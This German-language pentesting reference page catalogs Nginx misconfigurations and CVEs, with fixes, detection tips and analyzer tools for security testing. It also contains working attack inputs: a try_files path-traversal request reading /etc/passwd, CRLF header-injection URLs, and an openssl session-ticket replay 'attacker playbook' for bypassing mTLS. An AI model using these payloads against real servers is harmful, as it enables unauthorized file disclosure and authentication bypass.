# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Fehlende root location <a href="#missing-root-location" id="missing-root-location"></a>

Beim Konfigurieren des Nginx-Servers spielt die **root directive** eine entscheidende Rolle, da sie das Basisverzeichnis definiert, aus dem Dateien ausgeliefert werden. Betrachten Sie das folgende Beispiel:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In dieser Konfiguration ist `/etc/nginx` als root-Verzeichnis angegeben. Diese Einrichtung ermöglicht den Zugriff auf Dateien im angegebenen root-Verzeichnis, wie z. B. `/hello.txt`. Es ist jedoch wichtig zu beachten, dass nur eine spezifische location (`/hello.txt`) definiert ist. Es gibt keine Konfiguration für die Root-Location (`location / {...}`). Dieses Fehlen bedeutet, dass die `root`-Direktive global angewendet wird und Anfragen an den Root-Pfad `/` den Zugriff auf Dateien unter `/etc/nginx` erlauben.

Eine kritische Sicherheitsbetrachtung ergibt sich aus dieser Konfiguration. Eine einfache `GET`-Anfrage, wie `GET /nginx.conf`, könnte sensible Informationen preisgeben, indem die Nginx-Konfigurationsdatei unter `/etc/nginx/nginx.conf` ausgeliefert wird. Das Setzen des `root` auf ein weniger sensibles Verzeichnis, wie `/etc`, könnte dieses Risiko mindern, erlaubt jedoch möglicherweise weiterhin unbeabsichtigten Zugriff auf andere kritische Dateien, einschließlich weiterer Konfigurationsdateien, access logs und sogar verschlüsselter Zugangsdaten, die für HTTP basic authentication verwendet werden.

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

In den Konfigurationsdateien von Nginx ist eine sorgfältige Überprüfung der "location"-Direktiven angebracht. Eine als Local File Inclusion (LFI) bekannte Schwachstelle kann unbeabsichtigt durch eine Konfiguration eingeführt werden, die der folgenden ähnelt:
```
location /imgs {
alias /path/images/;
}
```
Diese Konfiguration ist anfällig für LFI-Angriffe, da der Server Anfragen wie `/imgs../flag.txt` als Versuch interpretiert, auf Dateien außerhalb des vorgesehenen Verzeichnisses zuzugreifen, und das effektiv zu `/path/images/../flag.txt` auflöst. Dieser Fehler ermöglicht es Angreifern, Dateien vom Dateisystem des Servers abzurufen, die über das Web nicht zugänglich sein sollten.

Um diese Schwachstelle zu beheben, sollte die Konfiguration wie folgt angepasst werden:
```
location /imgs/ {
alias /path/images/;
}
```
Mehr Infos: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix-Tests:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Unsichere Pfadbeschränkung <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Sieh dir die folgende Seite an, um zu lernen, wie man Direktiven wie die folgenden umgeht:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Unsichere Variablenverwendung / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Die Variablen `$uri` und `$document_ur`i sind verwundbar; das lässt sich beheben, indem man sie durch `$request_uri` ersetzt.
>
> Ein Regex kann ebenfalls verwundbar sein, z. B.:
>
> `location ~ /docs/([^/])? { … $1 … }` - Verwundbar
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Nicht verwundbar (prüft Leerzeichen)
>
> `location ~ /docs/(.*)? { … $1 … }` - Nicht verwundbar

Eine Verwundbarkeit in der Nginx-Konfiguration wird im folgenden Beispiel demonstriert:
```
location / {
return 302 https://example.com$uri;
}
```
Die Zeichen \r (Carriage Return) und \n (Line Feed) kennzeichnen Zeilenumbrüche in HTTP-Requests, und ihre URL-codierten Formen werden als `%0d%0a` dargestellt. Wenn diese Zeichen in einer Anfrage enthalten sind (z. B. `http://localhost/%0d%0aDetectify:%20clrf`) an einen fehlkonfigurierten Server, führt das dazu, dass der Server einen neuen Header namens `Detectify` ausgibt. Das passiert, weil die Variable $uri die URL-codierten Zeilenumbrüche decodiert, was zu einem unerwarteten Header in der Antwort führt:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Erfahre mehr über die Risiken von CRLF injection und response splitting unter [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Auch diese Technik ist [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) mit einigen verwundbaren Beispielen und Erkennungsmechanismen. Zum Beispiel: Um diese Fehlkonfiguration aus einer blackbox-Perspektive zu erkennen, kannst du folgende Requests senden:

- `https://example.com/%20X` - beliebiger HTTP-Code
- `https://example.com/%20H` - 400 Bad Request

Wenn verwundbar, liefert der erste Request eine Antwort, da "X" jede HTTP-Methode sein kann, und der zweite führt zu einem Fehler, da H keine gültige Methode ist. Der Server würde also etwas wie: `GET / H HTTP/1.1` erhalten und das löst den Fehler aus.

Weitere Erkennungsbeispiele wären:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - beliebiger HTTP-Code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Einige in dem Vortrag vorgestellte verwundbare Konfigurationen waren:

- Beachte, wie **`$uri`** unverändert in der finalen URL gesetzt ist
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Beachte erneut, wie **`$uri`** in der URL vorkommt (dieses Mal innerhalb eines Parameters)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Jetzt in AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Beliebige Variable

Es wurde festgestellt, dass **vom Benutzer gelieferte Daten** unter bestimmten Umständen als **Nginx-Variable** behandelt werden könnten. Die Ursache dieses Verhaltens bleibt etwas rätselhaft, ist jedoch weder selten noch einfach zu verifizieren. Diese Anomalie wurde in einem Security-Report auf HackerOne hervorgehoben, der [here](https://hackerone.com/reports/370094) eingesehen werden kann. Weitere Untersuchungen der Fehlermeldung führten zur Identifizierung des Auftretens innerhalb des [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), wobei Server Side Includes (SSI) als Ursache ausgemacht wurden.

Um **diese Fehlkonfiguration zu erkennen**, kann folgender Befehl ausgeführt werden, der das Setzen eines Referer-Headers zum Testen der Variablenausgabe beinhaltet:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Scans nach dieser Fehlkonfiguration in verschiedenen Systemen zeigten mehrere Fälle, in denen Nginx-Variablen von einem Benutzer ausgegeben werden konnten. Eine Abnahme der Anzahl verwundbarer Instanzen deutet jedoch darauf hin, dass Patch-Maßnahmen teilweise erfolgreich waren.

### Verwendung von try_files mit $URI$ARGS-Variablen

Folgende Nginx-Fehlkonfiguration kann zu einer LFI-Schwachstelle führen:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
In unserer Konfiguration haben wir die Direktive `try_files`, die verwendet wird, um das Vorhandensein von Dateien in einer angegebenen Reihenfolge zu prüfen. Nginx liefert die erste Datei, die es findet. Die Grundsyntax der Direktive `try_files` ist wie folgt:
```
try_files file1 file2 ... fileN fallback;
```
Nginx prüft das Vorhandensein jeder Datei in der angegebenen Reihenfolge. Existiert eine Datei, wird sie sofort ausgeliefert. Existiert keine der angegebenen Dateien, wird die Anfrage an die Fallback-Option weitergeleitet, die eine andere URI oder eine bestimmte Fehlerseite sein kann.

Wenn jedoch die Variablen $uri$args in dieser Direktive verwendet werden, versucht Nginx, nach einer Datei zu suchen, die dem Request-URI in Kombination mit beliebigen Query-String-Argumenten entspricht. Daher können wir diese Konfiguration ausnutzen:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Mit folgendem payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Mit unserem payload entkommen wir dem Root-Verzeichnis (in der Nginx-Konfiguration definiert) und laden die Datei `/etc/passwd`. In den Debug-Logs können wir beobachten, wie Nginx die Dateien ausprobiert:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC gegen Nginx unter Verwendung der oben genannten Konfiguration:
![Beispiel burp-Anfrage](../../images/nginx_try_files.png)

## Rohes Auslesen von Backend-Antworten

Nginx bietet über `proxy_pass` eine Funktion, die das Abfangen von Fehlern und HTTP-Headern ermöglicht, die vom Backend erzeugt werden, mit dem Ziel, interne Fehlermeldungen und Header zu verbergen. Dies wird dadurch erreicht, dass Nginx bei Backend-Fehlern eigene Fehlerseiten ausliefert. Es treten jedoch Probleme auf, wenn Nginx auf eine ungültige HTTP-Anfrage trifft. Eine solche Anfrage wird unverändert an das Backend weitergeleitet, und die Rohantwort des Backends wird dann direkt an den Client gesendet, ohne dass Nginx eingreift.

Betrachten Sie ein Beispiel mit einer uWSGI-Anwendung:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Um dies zu verwalten, werden spezifische Direktiven in der Nginx-Konfiguration verwendet:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Diese Direktive ermöglicht es Nginx, eine benutzerdefinierte Antwort für Backend-Antworten mit einem Statuscode größer als 300 zu liefern. Sie stellt sicher, dass in unserem Beispiel mit einer uWSGI-Anwendung eine `500 Error`-Antwort von Nginx abgefangen und verarbeitet wird.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Wie der Name sagt, blendet diese Direktive bestimmte HTTP-Header gegenüber dem Client aus und erhöht so Privatsphäre und Sicherheit.

Wenn eine gültige `GET`-Anfrage gestellt wird, verarbeitet Nginx sie normal und liefert eine Standard-Fehlerantwort, ohne geheime Header preiszugeben. Eine ungültige HTTP-Anfrage umgeht hingegen diesen Mechanismus, was zur Offenlegung roher Backend-Antworten führt, einschließlich geheimer Header und Fehlermeldungen.

## merge_slashes set to off

Standardmäßig ist Nginx' **`merge_slashes`-Direktive** auf **`on`** gesetzt, wodurch mehrere Schrägstriche in einer URL zu einem einzelnen Schrägstrich zusammengefasst werden. Diese Funktion, die die URL-Verarbeitung vereinfacht, kann unbeabsichtigt Schwachstellen in hinter Nginx laufenden Anwendungen verbergen, insbesondere solche, die für local file inclusion (LFI)-Angriffe anfällig sind. Die Sicherheitsexperten **Danny Robinson und Rotem Bar** haben die potenziellen Risiken dieses Standardverhaltens hervorgehoben, besonders wenn Nginx als Reverse-Proxy agiert.

Um solche Risiken zu mindern, wird empfohlen, die **`merge_slashes`-Direktive auszuschalten** für Anwendungen, die für diese Schwachstellen anfällig sind. Dadurch stellt man sicher, dass Nginx Anfragen an die Anwendung weiterleitet, ohne die URL-Struktur zu verändern, und somit keine zugrundeliegenden Sicherheitsprobleme verschleiert.

For more information check [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Bösartige Response-Header**

Wie in [**diesem writeup**](https://mizu.re/post/cors-playground) gezeigt, gibt es bestimmte Header, die — sofern sie in der Antwort des Webservers vorhanden sind — das Verhalten des Nginx-Proxys ändern. Du kannst sie [**in den docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/) nachschlagen:

- `X-Accel-Redirect`: Weist Nginx an, eine Anfrage intern zu einer angegebenen Location umzuleiten.
- `X-Accel-Buffering`: Steuert, ob Nginx die Antwort puffern soll oder nicht.
- `X-Accel-Charset`: Legt den Zeichensatz für die Antwort fest, wenn X-Accel-Redirect verwendet wird.
- `X-Accel-Expires`: Setzt die Ablaufzeit für die Antwort, wenn X-Accel-Redirect verwendet wird.
- `X-Accel-Limit-Rate`: Begrenzt die Übertragungsrate für Antworten, wenn X-Accel-Redirect verwendet wird.

Zum Beispiel bewirkt der Header **`X-Accel-Redirect`**, dass nginx eine interne **Weiterleitung** durchführt. Wenn eine nginx-Konfiguration beispielsweise **`root /`** enthält und der Webserver in seiner Antwort **`X-Accel-Redirect: .env`** zurückgibt, sendet nginx den Inhalt von **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

In der **Nginx configuration** spielt die `map`-Direktive oft eine Rolle bei der **authorization control**. Ein häufiger Fehler ist es, keinen **default**-Wert anzugeben, was zu unautorisiertem Zugriff führen kann. Zum Beispiel:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Ohne `default` kann ein **böswilliger Benutzer** die Sicherheit umgehen, indem er auf eine **undefinierte URI** innerhalb von `/map-poc` zugreift. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) empfiehlt, einen **Standardwert** zu setzen, um solche Probleme zu vermeiden.

### **DNS Spoofing Vulnerability**

DNS spoofing gegen Nginx ist unter bestimmten Bedingungen möglich. Wenn ein Angreifer den **DNS-Server** kennt, den Nginx verwendet, und dessen DNS-Abfragen abfangen kann, kann er DNS-Einträge fälschen. Diese Methode ist jedoch wirkungslos, wenn Nginx so konfiguriert ist, dass es für die DNS-Auflösung **localhost (127.0.0.1)** verwendet. Nginx erlaubt es, einen DNS-Server wie folgt anzugeben:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` und `internal` Direktiven**

Die **`proxy_pass`** Direktive wird verwendet, um Anfragen an andere Server weiterzuleiten, entweder intern oder extern. Die **`internal`** Direktive stellt sicher, dass bestimmte Locations nur innerhalb von Nginx zugänglich sind. Obwohl diese Direktiven an sich keine Schwachstellen darstellen, erfordert ihre Konfiguration eine sorgfältige Prüfung, um Sicherheitslücken zu vermeiden.

## proxy_set_header Upgrade & Connection

Wenn der nginx-Server so konfiguriert ist, dass die Header Upgrade und Connection weitergegeben werden, könnte ein [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) durchgeführt werden, um auf geschützte/interne Endpunkte zuzugreifen.

> [!CAUTION]
> Diese Schwachstelle würde einem Angreifer erlauben, **eine direkte Verbindung mit dem `proxy_pass` endpoint herzustellen** (`http://backend:9999` in diesem Fall), dessen Inhalt nicht von nginx überprüft wird.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Beachten Sie, dass selbst wenn `proxy_pass` auf einen bestimmten **Pfad** wie `http://backend:9999/socket.io` gezeigt hat, die Verbindung mit `http://backend:9999` hergestellt wird, sodass Sie **jeden anderen Pfad innerhalb dieses internen Endpunkts kontaktieren können. Es spielt also keine Rolle, ob in der URL von proxy_pass ein Pfad angegeben ist.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Während 2024 hat Nginx CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 und CVE-2024-35200 veröffentlicht, die zeigen, dass eine **einzige bösartige QUIC-Session** Worker-Prozesse crashen oder zu einem memory leak führen kann, sobald das experimentelle `ngx_http_v3_module` kompiliert ist und ein `listen ... quic`-Socket exponiert wird. Betroffene Builds sind 1.25.0–1.25.5 und 1.26.0, während 1.27.0/1.26.1 die Fixes enthalten; die Speicheroffenlegung (CVE-2024-34161) erfordert zusätzlich MTUs größer als 4096 Bytes, damit sensitive Daten sichtbar werden (Details im 2024 nginx advisory weiter unten).

**Recon- & Exploitation-Hinweise**

- HTTP/3 ist optional, also scannen Sie nach `Alt-Svc: h3=":443"`-Antworten oder brute-force UDP/443 QUIC-Handshakes; sobald bestätigt, fuzzing Sie den Handshake und STREAM-Frames mit benutzerdefinierten `quiche-client`/`nghttp3`-Payloads, um Worker-Crashes auszulösen und Log-Leak zu erzwingen.
- Schnell die Unterstützung des Ziels fingerprinten mit:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Umgehung der TLS-Session-Wiederaufnahme bei Client-Zertifikatsauthentifizierung (CVE-2025-23419)

Ein Advisory aus Februar 2025 gab bekannt, dass nginx 1.11.4–1.27.3, gebaut mit OpenSSL, das **Wiederverwenden einer TLS 1.3-Session** von einem name-basierten Virtual Host in einem anderen erlaubt, sodass ein Client, der mit einem zertifikatsfreien Host verhandelt hat, das Ticket/PSK replayen kann, um in einen vhost zu springen, der mit `ssl_verify_client on;` geschützt ist, und mTLS vollständig zu umgehen. Der Bug tritt auf, sobald mehrere Virtual Hosts denselben TLS 1.3-Session-Cache und Tickets teilen (siehe das 2025 nginx-Advisory weiter unten).

**Angreifer-Playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Wenn das Ziel verwundbar ist, wird der zweite Handshake abgeschlossen, ohne ein Client-Zertifikat vorzulegen, wodurch geschützte Bereiche offengelegt werden.

**Was zu prüfen ist**

- Gemischte `server_name`-Blöcke, die `ssl_session_cache shared:SSL` sowie `ssl_session_tickets on;` gemeinsam nutzen.
- Admin-/API-Blöcke, die mTLS erwarten, aber gemeinsame Session-Cache-/Ticket-Einstellungen von öffentlichen Hosts erben.
- Automatisierung, die TLS 1.3 session resumption global aktiviert (z. B. Ansible roles), ohne vhost-Isolation zu berücksichtigen.

## HTTP/2 Rapid Reset-Resilienz (Verhalten von CVE-2023-44487)

Der HTTP/2 Rapid Reset-Angriff (CVE-2023-44487) betrifft nginx weiterhin, wenn Betreiber `keepalive_requests` oder `http2_max_concurrent_streams` über die Standardwerte hinaus hochdrehen: ein Angreifer öffnet eine HTTP/2-Verbindung, flutet sie mit Tausenden von Streams und sendet dann sofort `RST_STREAM`-Frames, sodass die concurrency ceiling nie erreicht wird, während die CPU weiterhin an der tear-down logic arbeitet. Nginx defaults (128 concurrent streams, 1000 keepalive requests) halten den blast radius klein; das deutliche Erhöhen dieser Grenzwerte macht es trivial, workers schon mit einem einzigen Client auszuhungern (siehe das unten referenzierte F5 write-up).

**Erkennungstipps**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts, die ungewöhnlich hohe Werte für diese Direktiven preisgeben, sind bevorzugte Ziele: Ein einzelner HTTP/2-Client kann durch wiederholte Erstellung von Streams und sofortige `RST_STREAM`-Frames die CPU auslasten, ohne die Gleichzeitigkeitsbegrenzung auszulösen.

## Probieren Sie es selbst

Detectify hat ein GitHub-Repository erstellt, in dem Sie Docker verwenden können, um Ihren eigenen verwundbaren Nginx-Testserver mit einigen der in diesem Artikel besprochenen Fehlkonfigurationen einzurichten und diese selbst zu finden!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Static-Analyzer-Tools

### [GIXY](https://github.com/yandex/gixy)

Gixy ist ein Tool zur Analyse von Nginx-Konfigurationen. Hauptziel von Gixy ist es, Sicherheitsfehlkonfigurationen zu verhindern und die Fehlererkennung zu automatisieren.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner ist ein einfaches Tool, um nach häufigen Nginx-Fehlkonfigurationen und Schwachstellen zu suchen.

## Referenzen

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
